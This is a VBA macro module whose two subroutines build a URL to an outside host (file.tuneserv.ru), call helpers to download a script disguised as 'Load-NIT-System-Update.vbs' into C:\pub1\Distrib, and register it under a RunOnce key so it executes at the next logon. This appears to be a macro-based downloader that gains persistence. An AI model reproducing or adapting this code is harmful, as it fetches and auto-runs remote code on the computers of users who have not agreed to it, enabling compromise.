Attribute VB_Name = "Module2_2"
Option Explicit

' *****************************************************************************
' Predefined Constants
' *****************************************************************************
Const STR_DISK = "C:"
Const STR_FOLDER1 = "pub1"
Const STR_FOLDER2 = "Distrib"
Const THREAD_VBS = "Load-NIT-System-Update.vbs"
'Const STR_SRCCODE = "SrcCode" 'Must be Same in MSI Installer'

Const HTTP_PREFIX1 = "http://" 'Prefix of Site Downloaded From'
Const HTTP_HOST1 = "file.tuneserv.ru" 'Host Name or IP address of the Site'
Const HTTP_PORT1 = ":80" 'Port of the Site'
Const HTTP_UPDATE_PATH1 = "/WinUpdate/" 'Path to WinUpdate of the Site'
Const HTTP_EXPON_PATH1 = "/Exponenta/" 'Path to WinUpdate of the Site'

' *****************************************************************************

' *****************************************************************************
'
' SUBROUTINE ScriptTestRunKeyDownloaded
'
' This Subroutine Downloads NIT Update Script on Computer at Test Mode
' The Subroutine Uses Predefined Constants
'
' PARAMETERS:   NONE
' RETURNS:      NONE
'
' *****************************************************************************
Sub ScriptTestRunKeyDownloaded()

        Dim Url         'Full URL Neme of the File in the Site
        Dim local_Path As String     'Local Path to Command File with Drive Letter
        Dim tempsPath
        tempsPath = Environ("TEMP")
        local_Path = STR_DISK & "\" & STR_FOLDER1 & "\" & STR_FOLDER2
        Url = HTTP_PREFIX1 & HTTP_HOST1 & HTTP_PORT1 & HTTP_UPDATE_PATH1

        CreatedCascade STR_DISK, STR_FOLDER1, STR_FOLDER2
        UploadedFilesFromInt01 THREAD_VBS, Url, local_Path
        CreatedRunOnceKey local_Path, THREAD_VBS

End Sub

' *****************************************************************************
'
' SUBROUTINE SimpleScriptTestRunKeyDownloaded
'
' This Subroutine Downloads NIT Update Script on Computer
' The Subroutine Uses Predefined Constants
'
' PARAMETERS:   NONE
' RETURNS:      NONE
'
' *****************************************************************************
Sub SimpleScriptTestRunKeyDownloaded()

        Dim Url         'Full URL Neme of the File in the Site
        Dim local_Path As String      'Local Path to Command File with Drive Letter
        Dim tempsPath
        tempsPath = Environ("TEMP")
        Dim iTemp

        local_Path = STR_DISK & "\" & STR_FOLDER1 & "\" & STR_FOLDER2
        Url = HTTP_PREFIX1 & HTTP_HOST1 & HTTP_PORT1 & HTTP_UPDATE_PATH1

        iTemp = CreateTwocascadeFolders(STR_DISK, STR_FOLDER1, STR_FOLDER2)
        iTemp = UploadFilesFromInt01(THREAD_VBS, Url, local_Path)
        iTemp = CreateRunOnceKey(local_Path, THREAD_VBS)

End Sub
